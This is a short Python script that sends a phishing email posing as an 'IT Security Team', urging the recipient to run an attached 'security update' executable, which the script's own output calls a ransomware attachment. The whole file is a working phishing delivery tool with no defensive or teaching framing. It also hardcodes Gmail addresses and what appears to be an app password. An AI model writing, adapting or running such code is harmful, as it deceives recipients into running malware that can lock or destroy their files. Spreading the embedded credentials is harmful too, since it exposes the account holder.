import smtplib
import ssl
from email.message import EmailMessage
from email.mime.base import MIMEBase
from email import encoders
import os

def send_phishing_email(smtp_server, port, sender_email, sender_password, receiver_email, exe_file_path):
    # Set up the email message with multipart
    message = EmailMessage()
    message["From"] = sender_email
    message["To"] = receiver_email
    message["Subject"] = "Urgent: Important Security Update Attached"
    
    # Set the email body content
    message.set_content("Hello,\n\nPlease find attached a critical security update. Run it immediately to protect your files.\n\nRegards,\nIT Security Team")

    # Attach the .exe file
    with open(exe_file_path, "rb") as attachment:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header(
            "Content-Disposition",
            f"attachment; filename={os.path.basename(exe_file_path)}",
        )
        # Attach the file to the message
        message.add_attachment(part.get_payload(decode=True), maintype="application", subtype="octet-stream", filename=os.path.basename(exe_file_path))

    # Set up the SSL context and send the email
    context = ssl.create_default_context()
    with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:
        server.login(sender_email, sender_password)
        server.send_message(message)

    print("Email sent successfully with the ransomware attachment.")

# Example usage
smtp_server = "smtp.gmail.com"
port = 465  # For SSL
sender_email = "umeshsagar4510@gmail.com"
sender_password = "hgiu wtfl jhzz qclr"  # Ensure this is secure
receiver_email = "aravindsagar4510@gmail.com"
exe_file_path = "/home/naveena/Project/dist/securitypatch"  # Path to the .exe file

send_phishing_email(smtp_server, port, sender_email, sender_password, receiver_email, exe_file_path)

